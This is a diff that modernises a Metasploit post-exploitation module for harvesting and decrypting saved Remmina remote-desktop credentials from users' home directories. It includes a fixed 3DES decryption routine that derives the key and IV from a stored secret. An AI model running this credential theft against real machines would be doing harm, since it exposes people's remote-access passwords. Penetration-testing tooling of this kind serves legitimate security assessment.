@@ -1,12 +1,9 @@
-# encoding: binary
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Post
+class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Post::Unix
 
@@ -33,7 +30,7 @@ class Metasploit3 < Msf::Post
       vprint_status('No Reminna credentials collected')
     else
       vprint_good("Collected #{creds.size} sets of Remmina credentials")
-      cred_table = Rex::Ui::Text::Table.new(
+      cred_table = Rex::Text::Table.new(
         'Header'  => 'Remmina Credentials',
         'Indent'  => 1,
         'Columns' => %w(Host Port Service User Password)
@@ -49,7 +46,8 @@ class Metasploit3 < Msf::Post
   end
 
   def decrypt(secret, data)
-    c = OpenSSL::Cipher::Cipher.new('des3')
+    c = OpenSSL::Cipher.new('des3')
+    c.decrypt
     key_data = Base64.decode64(secret)
     # the key is the first 24 bytes of the secret
     c.key = key_data[0, 24]
@@ -57,7 +55,6 @@ class Metasploit3 < Msf::Post
     c.iv = key_data[24, 8]
     # passwords less than 16 characters are padded with nulls
     c.padding = 0
-    c.decrypt
     p = c.update(Base64.decode64(data))
     p << c.final
     # trim null-padded, < 16 character passwords
@@ -70,7 +67,7 @@ class Metasploit3 < Msf::Post
     user_dirs = enum_user_directories
     if user_dirs.empty?
       print_error('No user directories found')
-      return
+      return creds
     end
 
     vprint_status("Searching for Remmina creds in #{user_dirs.size} user directories")
@@ -184,5 +181,4 @@ class Metasploit3 < Msf::Post
 
     create_credential(credential_data)
   end
-
 end
